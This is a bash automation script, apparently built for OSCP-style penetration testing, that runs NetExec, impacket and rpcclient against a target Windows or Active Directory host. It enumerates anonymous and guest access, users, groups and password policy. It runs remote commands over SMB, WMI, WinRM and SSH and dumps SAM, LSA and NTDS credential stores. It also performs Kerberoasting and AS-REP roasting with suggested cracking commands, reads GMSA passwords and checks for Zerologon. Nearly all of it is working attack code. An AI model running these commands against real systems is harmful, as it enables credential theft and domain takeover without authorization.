#!/bin/bash

# Default values
IP=""
user=""
pass=""
domain=""
hash=""

# Function to display help
usage() {
    echo "Usage: $0 -i IP [-u USER] [-p PASSWORD] [-d DOMAIN] [-H HASH]"
    echo "  -i  Target IP address"
    echo "  -u  Username"
    echo "  -p  Password"
    echo "  -d  Domain"
    echo "  -H  NTLM Hash"
    echo "  -h  Show this help message"
    exit 1
}

# Parse arguments
while getopts "i:u:p:d:H:h" opt; do
    case $opt in
        i) IP="$OPTARG" ;;
        u) user="$OPTARG" ;;
        p) pass="$OPTARG" ;;
        d) domain="$OPTARG" ;;
        H) hash="$OPTARG" ;;
        h) usage ;;
        *) usage ;;
    esac
done

# Check if IP is set
if [ -z "$IP" ]; then
    echo "Error: IP address is required."
    usage
fi

# Build optional flags
if [ -n "$domain" ]; then
    DOMAIN_FLAG="-d $domain"
else
    DOMAIN_FLAG=""
fi

if [ -n "$user" ]; then
    if [ -n "$hash" ]; then
        USER_FLAG="-u $user -H $hash"
        RPC_ARG="-U $domain\\\\$user --pw-nt-hash $hash"
        SECRETS_ARG="-hashes :$hash $domain/$user@$IP"
        RPCDUMP_ARG="-u $user -hashes :$hash -d $domain"
    elif [ -n "$pass" ]; then
        USER_FLAG="-u $user -p $pass"
        RPC_ARG="-U $domain\\\\$user%$pass"
        SECRETS_ARG="$domain/$user:$pass@$IP"
        RPCDUMP_ARG="-u $user -p $pass -d $domain"
    else
        USER_FLAG="-u $user"
        RPC_ARG="-U $domain\\\\$user"
        SECRETS_ARG="$domain/$user@$IP"
        RPCDUMP_ARG="-u $user -d $domain"
    fi
else
    USER_FLAG=""
    RPC_ARG="-U '' -N"
fi

HEADER='\033[95m'
OKBLUE='\033[94m'
OKCYAN='\033[96m'
OKGREEN='\033[92m'
WARNING='\033[93m'
FAIL='\033[91m'
ENDC='\033[0m'
BOLD='\033[1m'
UNDERLINE='\033[4m'

echo -e "\n\033[96m[+] Logging Enabled:\033[0m `pwd`/nxc-enum\n"
mkdir -p nxc-enum nxc-enum/smb nxc-enum/ldap

echo -e "\n\033[96m[+] OS info, Name, Domain, SMB versions\033[0m\n"
# checks if the SMB service is running; returns OS info, name, domain, SMB versions
# LDAP domain SID (requires credentials)
if [ -n "$user" ]; then
    unbuffer nxc ldap $IP $USER_FLAG --get-sid --users | tee nxc-enum/ldap/domain-sid.txt
else
    echo -e "\n\033[93m[!] Skipping LDAP domain SID (no credentials supplied)\033[0m"
fi

# Guest access (domain optional)
echo -e "\n\033[96m[+] Checking Guest access\033[0m"
if [ -n "$domain" ]; then
    guest_output=$(nxc smb $IP -d "$domain" -u 'guest' -p '' --shares)
else
    guest_output=$(nxc smb $IP -u 'guest' -p '' --shares)
fi
echo "$guest_output"

# Check if guest access succeeded and suggest commands
if echo "$guest_output" | grep -q "\[+\]" && ! echo "$guest_output" | grep -q "Error enumerating shares"; then
    # Check if we actually have accessible shares
    has_shares=false
    echo "$guest_output" | while read -r line; do
        clean_line=$(echo "$line" | sed 's/\x1b\[[0-9;]*m//g')
        if [[ "$clean_line" == *"READ"* ]] || [[ "$clean_line" == *"WRITE"* ]]; then
            has_shares=true
            break
        fi
    done
    
    if echo "$guest_output" | grep -qE "READ|WRITE"; then
        echo -e "\n\033[92m[+] Guest SMB access successful! Suggested commands:\033[0m"
        echo "rpcclient -U 'guest%' $IP"
        
        # Suggest specific shares if found
        echo "$guest_output" | while read -r line; do
            clean_line=$(echo "$line" | sed 's/\x1b\[[0-9;]*m//g')
            if [[ "$clean_line" == *"READ"* ]] || [[ "$clean_line" == *"WRITE"* ]]; then
                share=$(echo "$clean_line" | awk '{for(i=1;i<=NF;i++) if($i=="READ" || $i=="WRITE") print $(i-1)}')
                share=${share#\\}
                if [ ! -z "$share" ]; then
                    echo "smbclient -U 'guest%' //$IP/$share"
                fi
            fi
        done
        echo ""
    fi
fi

# Anonymous access (domain optional)
echo -e "\n\033[96m[+] Checking Anonymous access\033[0m"
if [ -n "$domain" ]; then
    anon_output=$(nxc smb $IP -d "$domain" -u '' -p '' --shares)
else
    anon_output=$(nxc smb $IP -u '' -p '' --shares)
fi
echo "$anon_output"

# Check if anonymous access succeeded and suggest commands
if echo "$anon_output" | grep -q "\[+\]" && ! echo "$anon_output" | grep -q "Error enumerating shares"; then
    if echo "$anon_output" | grep -qE "READ|WRITE"; then
        echo -e "\n\033[92m[+] Anonymous SMB access successful! Suggested commands:\033[0m"
        echo "rpcclient -U '' -N $IP"
        
        # Suggest specific shares if found
        echo "$anon_output" | while read -r line; do
            clean_line=$(echo "$line" | sed 's/\x1b\[[0-9;]*m//g')
            if [[ "$clean_line" == *"READ"* ]] || [[ "$clean_line" == *"WRITE"* ]]; then
                share=$(echo "$clean_line" | awk '{for(i=1;i<=NF;i++) if($i=="READ" || $i=="WRITE") print $(i-1)}')
                share=${share#\\}
                if [ ! -z "$share" ]; then
                    echo "smbclient -U '' -N //$IP/$share"
                fi
            fi
        done
        echo ""
    fi
fi

echo -e "\n\033[96m[+] Checking FTP Anonymous access\033[0m"
timeout 5s nxc ftp $IP -u 'anonymous' -p 'anonymous' --timeout 2

echo -e "\n\033[96m[+] Checking LDAP Anonymous access\033[0m"
timeout 5s nxc ldap $IP -u '' -p '' --timeout 2

echo -e "\n\033[96m[+] NFS Enumeration (No credentials required)\033[0m"
nfs_output=$(unbuffer nxc nfs $IP --shares | tee nxc-enum/smb/nfs-shares.txt)
echo "$nfs_output"

# Check for NFS shares and suggest mount commands
if echo "$nfs_output" | grep -qE "r--|rw-|rwx"; then
    echo -e "\n\033[92m[+] NFS shares found! Suggested mount commands:\033[0m"
    echo "$nfs_output" | grep -E "r--|rw-|rwx" | while read -r line; do
        clean_line=$(echo "$line" | sed 's/\x1b\[[0-9;]*m//g')
        # Extract the share path (starts with /)
        nfs_share=$(echo "$clean_line" | awk '{for(i=1;i<=NF;i++) if($i ~ /^\//) {print $i; exit}}'| head -n1)
        if [ ! -z "$nfs_share" ]; then
            echo "sudo mount -t nfs $IP:$nfs_share /mnt/nfs"
            echo "# Or with specific version: sudo mount -t nfs -o vers=3 $IP:$nfs_share /mnt/nfs"
        fi
    done
    echo ""
fi



# Helper function to run nxc and suggest login command if successful
# Helper function to run nxc and suggest login command if successful
check_and_suggest() {
    service=$1
    shift
    echo "Checking $service..."
    # Run the command and capture output
    output=$("$@")
    echo "$output"
    
    # Check for success indicator "[+]"
    if echo "$output" | grep -q "+"; then
        echo -e "\033[92m[+] Valid credentials for $service! Suggested command:\033[0m"
        
        # Prepare credential strings
        if [ -n "$hash" ]; then
            IMPACKET_CREDS="$domain/$user@$IP -hashes :$hash"
            WINRM_CREDS="-i $IP -u '$user' -H '$hash'"
            LDAP_IMPACKET="impacket-ldap-shell $domain/$user@$IP -hashes :$hash"
            SMBCLIENT_AUTH="-U '$domain/$user' --pw-nt-hash '$hash'"
        else
            IMPACKET_CREDS="$domain/$user:$pass@$IP"
            WINRM_CREDS="-i $IP -u '$user' -p '$pass'"
            LDAP_IMPACKET="impacket-ldap-shell '$domain/$user:$pass@$IP'"
            SMBCLIENT_AUTH="-U '$domain/$user%$pass'"
        fi

        case $service in
            "smb")
                # Suggest Impacket tools for SMB
                echo -e "\033[93m[!] Impacket tools for SMB:\033[0m"
                echo "impacket-psexec $IMPACKET_CREDS"
                echo "impacket-smbexec $IMPACKET_CREDS"
                
                # Check for Admin access (Pwn3d!)
                if echo "$output" | grep -q "Pwn3d!"; then
                     echo -e "\033[92m[+] Admin access (Pwn3d!) detected - tools above will work!\033[0m"
                else
                     echo -e "\033[91m[!] Note: Admin tools above require elevated privileges\033[0m"
                fi
                echo ""

                # Enumerate shares to see which ones are accessible
                echo "Enumerating shares for suggestions..."
                # Use the already captured output if it contains shares, or run it if needed.
                # Since we are optimizing to run --shares in the main call, we use $output.
                shares_output="$output"
                
                echo -e "\n\033[92m[+] Suggested connections:\033[0m"
                echo "$shares_output" | while read -r line; do
                    # Clean color codes for parsing
                    clean_line=$(echo "$line" | sed 's/\x1b\[[0-9;]*m//g')
                    
                    # Check for accessible shares (READ or WRITE)
                    if [[ "$clean_line" == *"READ"* ]] || [[ "$clean_line" == *"WRITE"* ]]; then
                        # Extract share name (it is the field before READ or WRITE)
                        share=$(echo "$clean_line" | awk '{for(i=1;i<=NF;i++) if($i=="READ" || $i=="WRITE") print $(i-1)}')
                        
                        # Remove leading backslash if present
                        share=${share#\\}
                        
                        if [ ! -z "$share" ]; then
                            echo "smbclient $SMBCLIENT_AUTH //$IP/$share"
                        fi
                    fi
                done
                ;;
            "wmi")
                if echo "$output" | grep -q "Pwn3d!"; then
                     echo -e "\033[92m[+] Admin access (Pwn3d!) detected - impacket-wmiexec should work!\033[0m"
                else
                     echo -e "\033[93m[!] Valid credentials, but Admin access not detected. impacket-wmiexec might fail (Access Denied).\033[0m"
                fi
                echo "impacket-wmiexec $IMPACKET_CREDS"
                ;;
            "winrm")
                echo "evil-winrm $WINRM_CREDS"
                ;;
            "mssql")
                echo "impacket-mssqlclient $IMPACKET_CREDS"
                ;;
            "ssh")
                echo "ssh '$user@$IP'"
                ;;
            "ftp")
                echo "ftp ftp://$user:$pass@$IP"
                ;;
            "vnc")
                echo "vncviewer $IP"
                ;;
            "ldap")
                # LDAP usually doesn't have a direct interactive shell, but we can suggest ldapsearch
                if [ -z "$hash" ]; then
                    echo "ldapsearch -x -H ldap://$IP -D \"$user@$domain\" -w '$pass' -b \"DC=${domain//./,DC=}\""
                fi
                echo "$LDAP_IMPACKET"
                ;;
        esac
        echo ""
    fi
}

echo -e "\n\033[96m[+] Validating credentials\033[0m\n"
# Build optional flags
# Flags already built at the top

# SMB (anonymous allowed, domain optional)
# Added --shares to check shares in one go
check_and_suggest smb nxc smb $IP $DOMAIN_FLAG $USER_FLAG --shares --timeout 2

# LDAP requires username (domain optional)
if [ -n "$user" ]; then
    check_and_suggest ldap nxc ldap $IP $DOMAIN_FLAG $USER_FLAG --timeout 2
else
    echo -e "\n\033[93m[!] Skipping LDAP check (no username supplied)\033[0m"
fi

# WinRM requires cr
# nxc rdp $IP -u $user -p $pass # RDP
# nxc ftp $IP -u $user -p $pass # FTP

echo -e "\n\033[96m[+] RPC Enumeration (rpcclient)\033[0m\n"
rpcclient $RPC_ARG $IP -c "queryuser 0" 2>/dev/null # RPC user query
rpcclient $RPC_ARG $IP -c "enumdomusers" 2>/dev/null | tee nxc-enum/smb/rpc-enumdomusers.txt # Enumerate domain users via RPC
rpcclient $RPC_ARG $IP -c "enumdomgroups" 2>/dev/null | tee nxc-enum/smb/rpc-enumdomgroups.txt # Enumerate domain groups via RPC

if [ -n "$user" ]; then
    echo -e "\n\033[96m[+] RPC Secrets Dump (impacket-secretsdump)\033[0m\n"
    impacket-secretsdump $SECRETS_ARG 2>/dev/null | tee nxc-enum/smb/rpc-secretsdump.txt # Dump SAM hashes via RPC
else
    echo -e "\n\033[93m[!] Skipping RPC Secrets Dump (no credentials supplied)\033[0m"
fi

echo -e "\n\033[96m[+] RPC Endpoint Dump (impacket-rpcdump)\033[0m\n"
impacket-rpcdump "$IP" $RPCDUMP_ARG 2>/dev/null | tee nxc-enum/smb/rpc-rpcdump.txt # Query RPC endpoint information

if [ -n "$user" ]; then
    echo -e "\n\033[96m[+] WinRM Enumeration:\033[0m"
    echo -e "\n\033[91m[+] WinRM Credentials Check\033[0m\n"
    check_and_suggest winrm nxc winrm $IP $DOMAIN_FLAG $USER_FLAG | tee nxc-enum/smb/winrm-credentials.txt

    echo -e "\n\033[91m[+] WinRM Command Execution (whoami)\033[0m\n"
    unbuffer nxc winrm $IP $DOMAIN_FLAG $USER_FLAG -x whoami | tee nxc-enum/smb/winrm-whoami.txt
else
    echo -e "\n\033[93m[!] Skipping WinRM Enumeration (no username supplied)\033[0m"
fi

# Redundant share listing removed (already checked in validation)

if [ -n "$user" ]; then
    echo -e "\n\033[96m[+] Enumerating domain users\033[0m\n"
    unbuffer nxc smb $IP $USER_FLAG --users | tee nxc-enum/smb/users.txt
    unbuffer nxc ldap $IP $USER_FLAG --users --active-users | tee nxc-enum/ldap/active-users.txt

    echo -e "\n\033[96m[+] Enumerating logged users\033[0m\n"
    unbuffer nxc smb $IP $USER_FLAG --loggedon-users | tee nxc-enum/smb/logged-users.txt

    echo -e "\n\033[96m[+] Enumerating Admin users\033[0m\n"
    unbuffer nxc ldap $IP $USER_FLAG --users --admin-count | tee nxc-enum/ldap/admin-count-users.txt

    echo -e "\n\033[96m[+] Enumerating domain users by bruteforcing RID\033[0m\n"
    unbuffer nxc smb $IP $USER_FLAG --rid-brute | tee nxc-enum/smb/rid-bruteforce.txt

    echo -e "\n\033[96m[+] Enumerating domain groups\033[0m\n"
    unbuffer nxc smb $IP $USER_FLAG --groups | tee nxc-enum/smb/domain-groups.txt

    echo -e "\n\033[96m[+] Enumerating local groups\033[0m\n"
    unbuffer nxc smb $IP $USER_FLAG --local-groups | tee nxc-enum/smb/local-groups.txt

    echo -e "\n\033[96m[+] Dumping password policy\033[0m\n"
    unbuffer nxc smb $IP $USER_FLAG --pass-pol | tee nxc-enum/smb/pw-policy.txt

    echo -e "\n\033[96m[+] Trying to execute commands:\033[0m\n"
    nxc smb $IP $USER_FLAG -x whoami
    nxc smb $IP $USER_FLAG -X '$PSVersionTable'
    nxc wmi $IP $USER_FLAG -x whoami
    nxc winrm $IP $USER_FLAG -x whoami
else
    echo -e "\n\033[93m[!] Skipping User/Group Enumeration & Command Execution (no username supplied)\033[0m"
fi

# Commented as it may be an auto-exploitation feature (OSCP exam)

# echo -e "\n\033[91m[+] Kerberoasting:\033[0m\n"
# nxc ldap $IP -u $user -p $pass --kerberoasting nxc-enum/ldap/kerberoasting.txt  

# echo -e "\n\033[91m[+] AS-REProasting:\033[0m\n"
# nxc ldap $IP -u users.txt -p $pass --asreproast nxc-enum/ldap/asreproasting.txt

# echo -e "\n\033[91m[+] Trusted for Delegation:\033[0m\n"
# unbuffer nxc ldap $IP -u $user -p $pass --trusted-for-delegation | tee nxc-enum/ldap/trusted-delegation.txt  

if [ -n "$user" ]; then
    echo -e "\n\033[91m[+] GMSA Passwords:\033[0m\n"
    unbuffer nxc ldap $IP $USER_FLAG --users --gmsa | tee nxc-enum/ldap/gmsa.txt  

    echo -e "\n\033[91m[+] Checking Anti Virus:\033[0m\n"
    unbuffer nxc smb $IP $USER_FLAG -M enum_av  | tee nxc-enum/ldap/anti_virus.txt  

    echo -e "\n\033[96m[+] LDAP Module Enumeration:\033[0m"

    echo -e "\n\033[91m[+] Machine Account Quota (maq)\033[0m\n"
    unbuffer nxc ldap $IP $USER_FLAG --users -M maq | tee nxc-enum/ldap/maq.txt

    echo -e "\n\033[91m[+] ADCS Templates\033[0m\n"
    unbuffer nxc ldap $IP $USER_FLAG --users -M adcs | tee nxc-enum/ldap/adcs.txt

    echo -e "\n\033[91m[+] User Description\033[0m\n"
    unbuffer nxc ldap $IP $USER_FLAG --users -M get-desc-users | tee nxc-enum/ldap/desc-users.txt

    echo -e "\n\033[91m[+] LDAP Checker\033[0m\n"
    unbuffer nxc ldap $IP $USER_FLAG --users -M ldap-checker | tee nxc-enum/ldap/ldap-checker.txt

    echo -e "\n\033[91m[+] Password Not Required\033[0m\n"
    unbuffer nxc ldap $IP $USER_FLAG --users --password-not-required | tee nxc-enum/ldap/password-not-required.txt

    echo -e "\n\033[91m[+] Trusted For Delegation\033[0m\n"
    unbuffer nxc ldap $IP $USER_FLAG --users --trusted-for-delegation | tee nxc-enum/ldap/trusted-for-delegation.txt

    echo -e "\n\033[91m[+] Kerberoasting\033[0m\n"
    rm -f nxc-enum/ldap/kerberoasting.txt kerberoasting.txt 2>/dev/null
    unbuffer nxc ldap $IP $USER_FLAG --kdcHost $IP --kerberoasting nxc-enum/ldap/kerberoasting.txt
    if [ -s nxc-enum/ldap/kerberoasting.txt ] && grep -q 'krb5tgs' nxc-enum/ldap/kerberoasting.txt 2>/dev/null; then
        cp nxc-enum/ldap/kerberoasting.txt ./kerberoasting.txt
        echo -e "\033[92m[+] Kerberoast hashes found! Saved to kerberoasting.txt\033[0m"
        echo -e "\033[92m[+] Suggested cracking commands:\033[0m"
        
        # Detect hash type and suggest correct mode
        if grep -q 'krb5tgs\$23\$' kerberoasting.txt 2>/dev/null; then
            echo "# etype 23 (RC4-HMAC) detected"
            echo "john --wordlist=/usr/share/wordlists/rockyou.txt kerberoasting.txt"
            echo "hashcat -m 13100 kerberoasting.txt /usr/share/wordlists/rockyou.txt"
        fi
        if grep -q 'krb5tgs\$17\$' kerberoasting.txt 2>/dev/null; then
            echo "# etype 17 (AES128-CTS-HMAC-SHA1-96) detected"
            echo "john --wordlist=/usr/share/wordlists/rockyou.txt kerberoasting.txt"
            echo "hashcat -m 19600 kerberoasting.txt /usr/share/wordlists/rockyou.txt"
        fi
        if grep -q 'krb5tgs\$18\$' kerberoasting.txt 2>/dev/null; then
            echo "# etype 18 (AES256-CTS-HMAC-SHA1-96) detected"
            echo "john --wordlist=/usr/share/wordlists/rockyou.txt kerberoasting.txt"
            echo "hashcat -m 19700 kerberoasting.txt /usr/share/wordlists/rockyou.txt"
        fi
        echo ""
    fi

    echo -e "\n\033[91m[+] AS-REProasting\033[0m\n"
    rm -f nxc-enum/ldap/asreproasting.txt asreproasting.txt 2>/dev/null
    unbuffer nxc ldap $IP $USER_FLAG --kdcHost $IP --asreproast nxc-enum/ldap/asreproasting.txt
    if [ -s nxc-enum/ldap/asreproasting.txt ] && grep -q 'krb5asrep' nxc-enum/ldap/asreproasting.txt 2>/dev/null; then
        cp nxc-enum/ldap/asreproasting.txt ./asreproasting.txt
        echo -e "\033[92m[+] AS-REP hashes found! Saved to asreproasting.txt\033[0m"
        echo -e "\033[92m[+] Suggested cracking commands:\033[0m"
        
        # Detect hash type and suggest correct mode
        if grep -q 'krb5asrep\$23\$' asreproasting.txt 2>/dev/null; then
            echo "# etype 23 (RC4-HMAC) detected"
            echo "john --wordlist=/usr/share/wordlists/rockyou.txt asreproasting.txt"
            echo "hashcat -m 18200 asreproasting.txt /usr/share/wordlists/rockyou.txt"
        fi
        if grep -q 'krb5asrep\$17\$' asreproasting.txt 2>/dev/null; then
            echo "# etype 17 (AES128-CTS-HMAC-SHA1-96) detected"
            echo "john --wordlist=/usr/share/wordlists/rockyou.txt asreproasting.txt"
            echo "hashcat -m 19800 asreproasting.txt /usr/share/wordlists/rockyou.txt"
        fi
        if grep -q 'krb5asrep\$18\$' asreproasting.txt 2>/dev/null; then
            echo "# etype 18 (AES256-CTS-HMAC-SHA1-96) detected"
            echo "john --wordlist=/usr/share/wordlists/rockyou.txt asreproasting.txt"
            echo "hashcat -m 19900 asreproasting.txt /usr/share/wordlists/rockyou.txt"
        fi
        echo ""
    fi
else
    echo -e "\n\033[93m[!] Skipping LDAP Enumeration & Roasting (no username supplied)\033[0m"
fi

if [ -n "$user" ]; then
    echo -e "\n\033[91m[+] Domain Controllers\033[0m\n"
    unbuffer nxc ldap $IP $USER_FLAG --dc-list | tee nxc-enum/ldap/domain-controllers.txt

    echo -e "\n\033[96m[+] SMB Module Enumeration:\033[0m"

    echo -e "\n\033[91m[+] Spider Plus (Find Interesting Files)\033[0m\n"
    unbuffer nxc smb $IP $USER_FLAG -M spider_plus | tee nxc-enum/smb/spider-plus.txt

    echo -e "\n\033[91m[+] Check Zerologon Vulnerability\033[0m\n"
    timeout 30s unbuffer nxc smb $IP $USER_FLAG -M zerologon --timeout 5 | tee nxc-enum/smb/zerologon.txt

    echo -e "\n\033[96m[+] MSSQL Enumeration:\033[0m"

    echo -e "\n\033[91m[+] MSSQL Info\033[0m\n"
    unbuffer nxc mssql $IP $USER_FLAG | tee nxc-enum/smb/mssql-info.txt

    echo -e "\n\033[91m[+] MSSQL Query (xp_dirtree)\033[0m\n"
    unbuffer nxc mssql $IP $USER_FLAG -x 'EXEC xp_dirtree "C:\\", 1;' | tee nxc-enum/smb/mssql-xp-dirtree.txt

    echo -e "\n\033[91m[+] MSSQL Query (sp_databases)\033[0m\n"
    unbuffer nxc mssql $IP $USER_FLAG -x 'EXEC sp_databases;' | tee nxc-enum/smb/mssql-databases.txt

    echo -e "\n\033[96m[+] SSH Enumeration:\033[0m"

    echo -e "\n\033[91m[+] SSH Credentials Check\033[0m\n"
    unbuffer nxc ssh $IP $USER_FLAG | tee nxc-enum/smb/ssh-credentials.txt

    echo -e "\n\033[91m[+] SSH Command Execution (whoami)\033[0m\n"
    unbuffer nxc ssh $IP $USER_FLAG -x whoami | tee nxc-enum/smb/ssh-whoami.txt

    echo -e "\n\033[96m[+] FTP Enumeration:\033[0m"

    echo -e "\n\033[91m[+] FTP Credentials Check\033[0m\n"
    timeout 5s unbuffer nxc ftp $IP $USER_FLAG | tee nxc-enum/smb/ftp-credentials.txt

    echo -e "\n\033[91m[+] FTP Share Enumeration\033[0m\n"
    timeout 5s unbuffer nxc ftp $IP $USER_FLAG --ls | tee nxc-enum/smb/ftp-shares.txt

    echo -e "\n\033[96m[+] VNC Enumeration:\033[0m"

    echo -e "\n\033[91m[+] VNC Credentials Check\033[0m\n"
    timeout 5s unbuffer nxc vnc $IP $USER_FLAG | tee nxc-enum/smb/vnc-credentials.txt

    echo -e "\n\033[96m[+] WMI Enumeration:\033[0m"

    echo -e "\n\033[91m[+] WMI Credentials Check\033[0m\n"
    check_and_suggest wmi nxc wmi $IP $USER_FLAG | tee nxc-enum/smb/wmi-credentials.txt

    echo -e "\n\033[91m[+] WMI Command Execution (whoami)\033[0m\n"
    unbuffer nxc wmi $IP $USER_FLAG -x whoami | tee nxc-enum/smb/wmi-whoami.txt

    echo -e "\n\033[96m[+] SMB Additional Enumeration:\033[0m"

    echo -e "\n\033[91m[+] SAM Hashes Dump\033[0m\n"
    unbuffer nxc smb $IP $USER_FLAG --sam | tee nxc-enum/smb/sam-hashes.txt

    echo -e "\n\033[91m[+] LSA Secrets Dump\033[0m\n"
    unbuffer nxc smb $IP $USER_FLAG --lsa | tee nxc-enum/smb/lsa-secrets.txt

    echo -e "\n\033[91m[+] NTDS Database Dump\033[0m\n"
    unbuffer nxc smb $IP $USER_FLAG --ntds | tee nxc-enum/smb/ntds-dump.txt
else
    echo -e "\n\033[93m[!] Skipping Additional Enumeration (no username supplied)\033[0m"
fi

# Commented as it may be an auto-exploitation feature (OSCP exam)

# echo -e "\n\033[91m[+] Administrator's ACE\033[0m\n"
# unbuffer nxc ldap $IP -u $user -p $pass -M daclread -o TARGET=Administrator ACTION=read | tee nxc-enum/ldap/admin-ace.txt # Read all the ACEs of the Administrator

# echo -e "\n\033[91m[+] DCSync Rights\033[0m\n"
# nxc ldap $IP -u $user -p $pass -M daclread -o TARGET_DN="DC=lunar,DC=eruca,DC=com" ACTION=read RIGHTS=DCSync # principals that have DCSync rights